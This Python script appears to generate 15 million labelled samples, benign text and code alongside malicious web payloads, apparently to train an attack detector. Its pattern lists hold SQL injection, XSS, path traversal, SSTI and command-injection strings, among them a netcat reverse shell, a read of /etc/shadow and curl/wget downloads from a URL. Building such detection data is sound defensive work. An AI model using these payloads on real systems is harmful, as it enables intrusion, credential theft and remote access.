#!/usr/bin/env python3
"""Generate 15M payload samples (10M benign, 5M malicious)."""
import argparse
import random
import string
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from generators.utils import ProgressTracker, RatioSampler, append_to_jsonl

# Attack patterns
SQLI_PATTERNS = [
    "' OR '1'='1", "'; DROP TABLE {t};--", "' UNION SELECT {c} FROM {t}--",
    "1' AND '{c}'='{c}", "admin'--", "' OR 1=1--", "1; EXEC xp_cmdshell('{c}')",
    "' UNION ALL SELECT NULL,{c}--", "1' ORDER BY {n}--", "' HAVING 1=1--"
]
XSS_PATTERNS = [
    "<script>alert('{c}')</script>", "<img src=x onerror=alert('{c}')>",
    "<svg onload=alert('{c}')>", "javascript:alert('{c}')", 
    "<body onload=alert('{c}')>", "<iframe src='javascript:{c}'>",
    "'\"><script>alert('{c}')</script>", "<input onfocus=alert('{c}') autofocus>"
]
CMDI_PATTERNS = [
    "; cat /etc/passwd", "| ls -la", "&& whoami", "`id`", "$(cat /etc/shadow)",
    "; nc -e /bin/sh {ip} {port}", "| curl {url}", "&& wget {url} -O /tmp/x"
]
PATH_PATTERNS = [
    "../../../etc/passwd", "....//....//etc/passwd", "%2e%2e%2f" * 5 + "etc/passwd",
    "/etc/passwd%00", "..\\..\\..\\windows\\system32\\config\\sam"
]
SSTI_PATTERNS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
    "{{config}}", "{{self.__class__}}", "${T(java.lang.Runtime)}"
]

# Benign patterns
CODE_TEMPLATES = [
    "def {func}({args}):\n    return {expr}",
    "class {cls}:\n    def __init__(self):\n        self.{attr} = {val}",
    "const {var} = ({args}) => {expr};",
    "function {func}({args}) {{ return {expr}; }}",
    "for {var} in range({n}):\n    print({var})"
]
BENIGN_TEXTS = [
    "Hello, my name is {name}.", "The weather today is {adj}.",
    "Please contact us at {email}.", "Order #{num} has been shipped.",
    "Thank you for your purchase of {item}.", "Meeting scheduled for {date}."
]

def rand_str(n=8): return ''.join(random.choices(string.ascii_lowercase, k=n))
def rand_int(a=1, b=9999): return random.randint(a, b)

def gen_malicious():
    """Generate a malicious payload."""
    attack_type = random.choice(['sqli', 'xss', 'cmdi', 'path', 'ssti'])
    if attack_type == 'sqli':
        p = random.choice(SQLI_PATTERNS)
        return p.format(t=rand_str(), c=rand_str(), n=rand_int(1, 10))
    elif attack_type == 'xss':
        return random.choice(XSS_PATTERNS).format(c=rand_str())
    elif attack_type == 'cmdi':
        return random.choice(CMDI_PATTERNS).format(ip=f"{rand_int(1,255)}.{rand_int(1,255)}.{rand_int(1,255)}.{rand_int(1,255)}", port=rand_int(1024, 65535), url=f"http://{rand_str()}.com/{rand_str()}")
    elif attack_type == 'path':
        return random.choice(PATH_PATTERNS)
    else:
        return random.choice(SSTI_PATTERNS)

def gen_benign():
    """Generate a benign payload."""
    if random.random() < 0.5:
        t = random.choice(CODE_TEMPLATES)
        return t.format(func=rand_str(), cls=rand_str().capitalize(), var=rand_str(3), 
                       args=rand_str(1), expr=f"{rand_str(1)} + {rand_int()}", 
                       attr=rand_str(), val=rand_int(), n=rand_int(1, 100))
    else:
        t = random.choice(BENIGN_TEXTS)
        return t.format(name=rand_str().capitalize(), adj=random.choice(['sunny', 'cloudy', 'rainy']),
                       email=f"{rand_str()}@{rand_str()}.com", num=rand_int(10000, 99999),
                       item=rand_str(), date=f"2026-{rand_int(1,12):02d}-{rand_int(1,28):02d}")

def generate_samples(n_benign: int, n_malicious: int, benign_dir: Path, malicious_dir: Path, batch_size: int = 100000):
    """Generate and save samples."""
    total = n_benign + n_malicious
    tracker = ProgressTracker(total, "Payload")
    
    benign_path = benign_dir / "payload_benign_expansion.jsonl"
    malicious_path = malicious_dir / "payload_malicious_expansion.jsonl"
    
    # Generate benign
    batch = []
    for i in range(n_benign):
        batch.append({"text": gen_benign(), "label": 0})
        if len(batch) >= batch_size:
            append_to_jsonl(benign_path, iter(batch))
            tracker.update(len(batch))
            batch = []
    if batch:
        append_to_jsonl(benign_path, iter(batch))
        tracker.update(len(batch))
    
    # Generate malicious
    batch = []
    for i in range(n_malicious):
        batch.append({"text": gen_malicious(), "label": 1})
        if len(batch) >= batch_size:
            append_to_jsonl(malicious_path, iter(batch))
            tracker.update(len(batch))
            batch = []
    if batch:
        append_to_jsonl(malicious_path, iter(batch))
        tracker.update(len(batch))
    
    tracker.close()
    print(f"Saved: {benign_path} ({n_benign:,} samples)")
    print(f"Saved: {malicious_path} ({n_malicious:,} samples)")

def main():
    parser = argparse.ArgumentParser(description="Generate payload samples")
    parser.add_argument("--total", type=int, default=15_000_000, help="Total samples")
    parser.add_argument("--benign-output", type=Path, default=Path("datasets/benign_60m"))
    parser.add_argument("--malicious-output", type=Path, default=Path("datasets/security_payloads"))
    args = parser.parse_args()
    
    sampler = RatioSampler(args.total)
    n_benign, n_malicious = sampler.get_counts()
    print(f"Generating {n_benign:,} benign + {n_malicious:,} malicious = {args.total:,} total")
    
    generate_samples(n_benign, n_malicious, args.benign_output, args.malicious_output)

if __name__ == "__main__":
    main()
